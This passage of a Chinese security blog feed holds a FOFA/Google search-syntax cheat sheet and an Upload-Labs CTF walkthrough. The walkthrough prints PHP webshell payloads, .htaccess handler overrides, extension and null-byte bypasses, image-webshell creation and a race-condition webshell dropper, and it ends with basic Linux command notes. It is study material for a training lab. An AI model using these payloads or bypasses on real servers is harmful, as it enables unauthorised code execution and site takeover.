//搜索qq.com所有的子域名</p><p>2、host=”edu.cn”      //从url中搜索edu.cn</p><p>3、ip= “11.1.1.1”     //搜索ip</p><p>4、server=”apache”     //搜索服务是apache的网站</p><p>5、os=”windows”      //搜素操作系统是windows的网站</p><p>6、port=3306 或者 protocol==”mysql” //搜索mysql数据库的网站</p><p>7、app=”致远”    //搜索致远oa办公系统搭建的网站，还可以搜设备，比如监控的</p><p>8、title=”登陆”      //从标题中搜索登陆</p><p>9、header=”thinkphp”    //从http的头里面搜thinkphp</p><p><a href="https://www.aqniu.com/tools-tech/20899.html" target="_blank" rel="noopener">详细使用教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 搜索语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
            <tag> fofa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs</title>
      <link href="/2021/01/17/upload-labs/"/>
      <url>/2021/01/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1433562661&auto=1&height=66"></iframe><h1 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h1><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426?utm_source=app&app_version=4.7.1&code=app_1562916241&uLinkId=usr1mkqgl919blen" target="_blank" rel="noopener">太厉害了，终于有人能把文件上传漏洞讲的明明白白了</a></p><h1 id="考点总结："><a href="#考点总结：" class="headerlink" title="考点总结："></a>考点总结：</h1><p>1.客户端的js验证：mime类型，文件内容，文件扩展名（JavaScript switcher或noscript）</p><p>2.检测文件幻数的绕过（图片马）：</p><ul><li><code>JPG: FF D8 FF EO 00 10 4A 46 49 46.</code></li><li><code>GIF:47 49 46 3839 61(GIF89a).</code></li><li><code>PNG:89 50 4E 47</code></li></ul><p>3.服务端扩展名黑名单</p><p>4.针对操作系统的解析漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202105192330536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>具体可以通过上方链接了解</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h1 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h1><p>问题：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p>解决：bp抓包，发现抓不到，说明是前端检测</p><pre><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;666.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>注意蚁剑连接的时候路径为：/upload/666.php</p><h1 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h1><p>提示：本pass在服务端对数据包的MIME进行检查！</p><p>重点在于<strong>Content-Type: image/jpeg</strong></p><h1 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h1><p>hints：本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！         </p><p>解决(解析漏洞)：用PHP 的别名进行黑名单绕过，如 php2, php3, php4, php5, phps, pht, phtm, phtml</p><h1 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h1><ul><li>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析</li><li>.htaccess可以写入apache配置信息，改变当前目录以及子目录的Apache配置信息。</li><li>前提条件： 配置上允许.htaccess生效<br>Apache开启rewrite模块<br>.apache配置文件为AllowOverride All(默认为None)</li></ul><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>.htaccess的设置：</p><pre><code>&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>这里要上传的文件名字为1.jpg</p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><pre><code>AddType application/x-httpd-php.jpg</code></pre><p> 所有jpg后祭都会背当做PHP解析</p><h1 id="PASS-05（理论上此关不存在）"><a href="#PASS-05（理论上此关不存在）" class="headerlink" title="PASS-05（理论上此关不存在）"></a>PASS-05（理论上此关不存在）</h1><p>hints：上传目录存在php文件（readme.php）</p><p><a href="https://blog.csdn.net/fdipzone/article/details/39064001" target="_blank" rel="noopener">上传.user.ini文件</a></p><p>php.ini中有两项<br> <strong>auto_prepend_file</strong> 在页面顶部加载文件<strong>auto_append_file</strong>  在页面底部加载文件</p><p>.user.ini文件内容：</p><pre><code>auto_prepend_file=1.jpg</code></pre><p>尚未成功，应该与版本有关</p><h1 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS-06"></a>PASS-06</h1><p>查看源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>几乎过滤了所有的后缀，但却允许大小写逃逸，所有没有对phP进行过滤！</p><p>访问：</p><pre><code>http://127.0.0.1/upload-labs/upload/1.php</code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_FILES</span>这个变量用与上传的文件参数设置，是一个多维数组数组的用法就是 <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span>是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span>包含了以下内容<span class="token punctuation">:</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> 客户端文件的原名称。<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> 文件的 <span class="token constant">MIME</span> 类型，需要浏览器提供该信息的支持，例如<span class="token string">"image/gif"</span>。<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> 已上传文件的大小，单位为字节。<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span> 文件被上传后在服务端储存的临时文件名。<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> 和该文件上传相关的错误代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h1><p>hints：本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1</p><p>|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml</p><p>|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx</p><p>|.cEr|.sWf|.swf|.htaccess后缀文件！</p><p>与第六关相比缺少：</p><pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><ul><li>利用<code>window对于文件和文件名的限制</code>，以下字符放在结尾时，不符合操作系统的命名规范,在最后生成文件时，<code>字符会被自动去除</code>。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210518214952407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>所以通过抓包在1.php文件后面加一个空格就可以逃逸</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210518215322209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h1><p>hints：本pass禁止上传所有可以解析的后缀！</p><p>缺少：</p><pre><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></pre><p>所以利用1.php.来进行逃逸</p><h1 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS-09"></a>PASS-09</h1><p>相比第八关缺少：</p><pre><code> $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></pre><p>::$DATA作用：php在windows中如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名(Windows文件流特性)</p><p>上传一句话木马的.php后缀文件，抓包加::$DATA，上传成功，蚁剑连接（连接的时候要把文件名的::$DATA去掉）</p><h1 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS-10"></a>PASS-10</h1><p>hints：本pass只允许上传.jpg|.png|.gif后缀的文件！</p><p>考察点  .[空格].绕过</p><p>与上一关区别：</p><pre><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code></pre><p>注意拼接部分<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>最后保存的是原始文件，而不是经过检测的文件</p><p>上传1.php. .</p><h1 id="PASS-11"><a href="#PASS-11" class="headerlink" title="PASS-11"></a>PASS-11</h1><p>双写绕过</p><pre><code> $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></pre><p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过</p><p><a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp" target="_blank" rel="noopener">PHP str_ireplace() 函数</a></p><p>将$file_name中的$deny_ext都替换为空</p><h1 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h1><p>hint：本pass上传路径可控！</p><p>也就是白名单过滤</p><p>看源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>%00是chr(O)，它不是空格，是NULL，空字符。</li><li>当程序在输出含有chr(O)变量时，chr(O)后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</li><li>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最后文件保存在本地时，<code>%00会截断文件名，只保存%00之前的内容</code>·。</li><li>前提条件： PHP版本 &lt; 5.3.4 、php的magic_quotes_gpc为OFF状态</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这样其文件名字后面跟的随机数就会被截断，保证之返回自己所设定的文件名</p><h1 id="Pass-13-00截断"><a href="#Pass-13-00截断" class="headerlink" title="Pass-13-00截断"></a>Pass-13-00截断</h1><p>post进行截断</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>POST不会像GET那样对%00进行自动解码，所以需要在二进制中进行修改  ，将hex改为00</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><h3 id="考察点-图片马上传"><a href="#考察点-图片马上传" class="headerlink" title="考察点  图片马上传"></a>考察点  图片马上传</h3><p>可以将图片带入到PHP代码里，从而导致PHP代码执行</p><h3 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h3><p>GIF的文件头GIF89a ,ZIP压缩文件文件头PK   ,7z压缩文件文件头7z</p><pre><code>法1.创建一个空的.php文件，用notepad++写入GIF89a  &lt;?php @eval($_POST[value]);?&gt;法2.gif后缀文件,用notepad++写入一句话木马</code></pre><p>把制作好的图片马上传，打开<code>文件包含漏洞</code>发送GET请求<code>？file=upload/图片文件名</code>，蚁剑连接即可</p><p>需要开启file读取权限</p><h3 id="制法二："><a href="#制法二：" class="headerlink" title="制法二："></a>制法二：</h3><ol><li>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</li><li>输入系统指令： <code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></li><li>这样图片木马就合成好了</li></ol><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-14</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-15</p><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">Pass-17</a></h1><p>有待深究</p><h1 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h1><p>所谓条件竞争，就是利用…..</p><p> 原因：后端文件没有进行严格的加锁设置，导致可以多用户同时访问一个文件</p><p>原理：php木马文件上传后端后，根据策略对文件审查，审查为php文件则进行移除，而当其审查之时我们访问php木马，造成文件竞争，进而php文件执行自身代码，创建其中命令</p><p> 木马文件（jingzheng.php）：</p><p> <code>&lt;?php $a = &#39;&lt;?php @eval($_POST[\&#39;a\&#39;])?&gt;&#39;;file_put_contents(&#39;1.php&#39;,$a)?&gt;</code></p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">PHP file_put_contents() 函数</a></p><p><a href="https://blog.csdn.net/qq_35350265/article/details/113337635" target="_blank" rel="noopener">操作细节</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux笔记</title>
      <link href="/2021/01/15/linux-da-xue-xi/"/>
      <url>/2021/01/15/linux-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1811084968&auto=1&height=66"></iframe><h1 id="Linux命令复习："><a href="#Linux命令复习：" class="headerlink" title="Linux命令复习："></a>Linux命令复习：</h1><p>mkdir (file)：创建一个文本夹</p><p>touch 创建txt文件</p><p>dir：查看当前的目录</p><p>ls -la：查看当前文件并更多信息（如：文件所被给予的权限）</p><p>rm <file>：-rf强行删除文件</file></p><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p><p><a href="https://www.runoob.com/linux/linux-comm-ping.html" target="_blank" rel="noopener">ping命令</a></p><h1 id="linux运维基础"><a href="#linux运维基础" class="headerlink" title="linux运维基础"></a>linux运维基础</h1><h2 id="磁盘文件管理"><a href="#磁盘文件管理" class="headerlink" title="磁盘文件管理"></a>磁盘文件管理</h2><p><strong>whereis python查找指定命令文件所存在的位置</strong></p><p><strong>clear清屏</strong></p><p><strong>rmdir删除文件夹</strong></p><p><strong>mv 剪切移动文件 -f移动文件夹</strong></p><p><strong>tar：重在打包</strong></p><p>c压缩打包</p><p>v回显打包信息</p><p>f按照文件操作方式进行操作</p><p><strong>gzip：解压压缩</strong></p><p>-r压缩指定该文件，包含文件夹</p><p>-d解压缩指定文件</p><p>可以通过ls -lh来观察大小</p><p><strong>bzip</strong></p><p><strong>zip与unzip</strong></p><p><strong>grep：</strong></p><p><code>grep &#39;root&#39; /etc/passwd</code></p><p>-i 忽略大小写</p><p><code>grep -i &#39;Root&#39; /etc/passwd</code></p><p>与上一命令返回结果相同</p><p>-v 只打印没有匹配到的：</p><p><code>grep -v &#39;root&#39; /etc/passwd</code></p><p>打印除了root以外的所有</p><p>-n 显示行数</p><p>–color 将匹配到的高亮显示</p><p><strong>sed：</strong>利用脚本处理文件</p><p>-n取消完整默认输出，只打印我们需要的：</p><p><code>sed -n &#39;1,3p&#39; 